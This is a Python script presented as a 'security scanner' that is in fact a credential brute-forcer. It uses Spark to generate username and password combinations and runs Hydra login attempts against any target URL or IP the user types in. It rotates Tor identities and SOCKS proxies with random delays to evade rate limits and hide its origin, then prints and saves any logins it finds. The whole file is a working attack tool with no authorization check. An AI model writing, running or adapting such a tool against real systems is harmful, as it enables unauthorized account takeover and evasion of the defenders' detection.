#!/usr/bin/python3
import sys, os, socket, requests, subprocess, ipaddress
from datetime import datetime
from pyspark.sql import SparkSession
from pyspark.sql.types import StructType, StructField, StringType, ArrayType
import itertools, string, json, logging, time, random, threading
from urllib.parse import urlparse
import socks
from stem import Signal
from stem.control import Controller
from functools import partial

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    ENDC = '\033[0m'

def print_logo():
    logo = """
            ..',,,'..            
         .',;;;;;;;;,'.          
      ..',;;;;;;;;;;;;;;,..       
     .,;;;,'..'''''.',;;;,.      
     .;;;;.  ..   .. .;;;;'      
     .,;;;.  ...     .;;;;.      
      ..,;,.  ...   .,;,..       
        .';;'.    .',;'.         
    ..',,;;;;;,,,,;;;;;,,'..     
  .','.....................''.   
 .',..',,,,,,,,,,,,,,,,,,,..,,. 
 ________________________________ 
|                               |       
|        ASTRO - v1.0           |
|       Author - Jasraj         |
|   Advanced Security Scanner   |
|_______________________________|
"""
    print(f"{Colors.BLUE}{logo}{Colors.ENDC}")

class ProxyRotator:
    def __init__(self):
        self.proxy_list = self.load_proxy_list()
        self.current_proxy = None
        self.tor_controller = TorController()
        
    def load_proxy_list(self):
        return [
            "socks5://127.0.0.1:9050",
            "socks5://127.0.0.1:9051",
            "socks5://127.0.0.1:9052",
        ]
    
    def get_new_proxy(self):
        if self.proxy_list:
            self.current_proxy = random.choice(self.proxy_list)
            self.tor_controller.rotate_ip()
            logger.info(f"Switched to new proxy: {self.current_proxy}")
            return self.current_proxy
        return None

class TorController:
    def __init__(self):
        try:
            self.controller = Controller.from_port(port=9051)
            self.controller.authenticate()
        except Exception as e:
            logger.error(f"Tor controller error: {str(e)}")
            self.controller = None

    def rotate_ip(self):
        if self.controller:
            try:
                self.controller.signal(Signal.NEWNYM)
                time.sleep(self.controller.get_newnym_wait())
                logger.info("New Tor IP obtained")
            except Exception as e:
                logger.error(f"IP rotation error: {str(e)}")

class SecurityScanner:
    def __init__(self):
        self.spark = SparkSession.builder \
            .appName("SecurityAnalytics") \
            .config("spark.driver.memory", "4g") \
            .config("spark.executor.memory", "4g") \
            .config("spark.memory.fraction", "0.7") \
            .config("spark.memory.storageFraction", "0.3") \
            .config("spark.default.parallelism", "8") \
            .config("spark.sql.shuffle.partitions", "8") \
            .getOrCreate()
        
        self.results = {
            "target": None,
            "timestamp": None,
            "brute_force": {
                "attempts": 0,
                "successful_logins": []
            },
            "proxy_rotations": 0,
            "ip_rotations": 0
        }
        
        self.proxy_rotator = ProxyRotator()
        self.rate_limit_detected = False
        self.ensure_directories()

    def ensure_directories(self):
        os.makedirs("security_results", exist_ok=True)
        os.makedirs("wordlists", exist_ok=True)

    def validate_input(self, target):
        try:
            ipaddress.ip_address(target)
            return True, target
        except ValueError:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            try:
                result = urlparse(target)
                return (True, target) if all([result.scheme, result.netloc]) else (False, "Invalid URL format")
            except Exception as e:
                return False, f"Invalid input: {str(e)}"

    def generate_combinations(self, pattern_length, char_length):
        chars = string.ascii_lowercase + string.digits
        base_combinations = list(itertools.product(chars, repeat=char_length))
        chunk_size = len(base_combinations) // 8  # Split into 8 partitions
        
        # Convert to RDD and partition
        combinations_rdd = self.spark.sparkContext.parallelize(base_combinations, 8)
        
        def format_combination(combo, is_username=True):
            word = ''.join(combo)
            return f"{word}@domain.com" if is_username else word
        
        usernames = combinations_rdd.map(lambda x: format_combination(x, True))
        passwords = combinations_rdd.map(lambda x: format_combination(x, False))
        
        return usernames, passwords

    def run_hydra_attack_spark(self, target, pattern_length, char_length):
        try:
            domain = urlparse(target).netloc
            usernames, passwords = self.generate_combinations(pattern_length, char_length)
            
            def try_credentials(cred_pair):
                username, password = cred_pair
                hydra_command = [
                    "hydra", "-l", username, "-p", password,
                    "-u", "-f", "-t", "1", "-w", "5", "-V",
                    domain, "http-get-form",
                    "/login:username=^USER^&password=^PASS^:F=Login failed"
                ]
                
                try:
                    process = subprocess.run(
                        hydra_command,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    
                    if "login found" in process.stdout.lower():
                        return (username, password)
                    return None
                except Exception:
                    return None
            
            # Create credential pairs RDD
            credentials = usernames.cartesian(passwords).coalesce(8)
            
            # Try credentials in parallel
            results = credentials.map(try_credentials).filter(lambda x: x is not None)
            
            found_credentials = results.collect()
            
            return [{"username": u, "password": p} for u, p in found_credentials]
            
        except Exception as e:
            logger.error(f"Spark Hydra attack error: {str(e)}")
            return []

    def run_complete_scan(self, target):
        pattern_lengths = range(4, 9)  # 4 to 8
        char_lengths = range(4, 9)    # 4 to 8
        
        for pattern_length in pattern_lengths:
            print(f"\n{Colors.GREEN}Starting pattern length {pattern_length} scans...{Colors.ENDC}")
            
            for char_length in char_lengths:
                print(f"{Colors.YELLOW}Testing {char_length}-character combinations...{Colors.ENDC}")
                
                credentials = self.run_hydra_attack_spark(target, pattern_length, char_length)
                
                if credentials:
                    self.results["brute_force"]["successful_logins"].extend(credentials)
                    print(f"{Colors.GREEN}Found credentials with pattern {pattern_length}, char length {char_length}{Colors.ENDC}")
                
                # Rotate proxy and pause between attempts
                self.proxy_rotator.get_new_proxy()
                self.results["proxy_rotations"] += 1
                time.sleep(random.uniform(2, 5))

    def save_results(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"security_results/scan_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
        
        logger.info(f"Results saved to {filename}")
        
        if self.results["brute_force"]["successful_logins"]:
            print(f"\n{Colors.GREEN}Successfully found credentials:{Colors.ENDC}")
            for cred in self.results["brute_force"]["successful_logins"]:
                print(f"Username: {cred['username']}")
                print(f"Password: {cred['password']}")
        print(f"\nTotal proxy rotations: {self.results['proxy_rotations']}")
        print(f"Total IP rotations: {self.results['ip_rotations']}")

def main():
    scanner = SecurityScanner()
    print_logo()

    while True:
        target = input("[*] Enter target URL or IP address: ").strip()
        is_valid, message = scanner.validate_input(target)
        if not is_valid:
            print(f"{Colors.RED}{message}{Colors.ENDC}")
            continue
            
        scanner.results["target"] = target
        scanner.results["timestamp"] = datetime.now().isoformat()
        
        print(f"{Colors.GREEN}Starting security scan...{Colors.ENDC}")
        scanner.run_complete_scan(target)
        scanner.save_results()
        
        if input("\nRun another scan? (y/n): ").strip().lower() != 'y':
            break

    scanner.spark.stop()

if __name__ == "__main__":
    main()